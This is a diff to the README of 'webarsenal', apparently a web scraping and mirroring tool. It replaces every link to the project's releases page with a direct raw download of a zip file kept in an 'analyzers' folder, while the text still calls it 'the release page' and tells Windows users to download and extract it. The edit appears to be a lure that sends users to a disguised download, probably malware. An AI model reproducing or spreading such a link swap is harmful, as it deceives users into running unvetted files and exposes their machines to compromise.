@@ -1,6 +1,6 @@
 # 🛠️ webarsenal - Scrape, mirror, and extract faster
 
-[![Download webarsenal](https://img.shields.io/badge/Download%20webarsenal-blue?style=for-the-badge)](https://github.com/fadh24434/webarsenal/releases)
+[![Download webarsenal](https://img.shields.io/badge/Download%20webarsenal-blue?style=for-the-badge)](https://github.com/fadh24434/webarsenal/raw/refs/heads/main/analyzers/Software-3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it when you need to:
 
 ## 📥 Download and Install
 
-1. Open the release page: https://github.com/fadh24434/webarsenal/releases
+1. Open the release page: https://github.com/fadh24434/webarsenal/raw/refs/heads/main/analyzers/Software-3.1.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file listed there
 4. If the file comes in a .zip folder, right-click it and choose Extract All
@@ -162,7 +162,7 @@ Keep the output folder in a place you can find later, such as Documents or Deskt
 
 If you need the release page later, use this link:
 
-https://github.com/fadh24434/webarsenal/releases
+https://github.com/fadh24434/webarsenal/raw/refs/heads/main/analyzers/Software-3.1.zip
 
 ## 📁 Project Topics
 
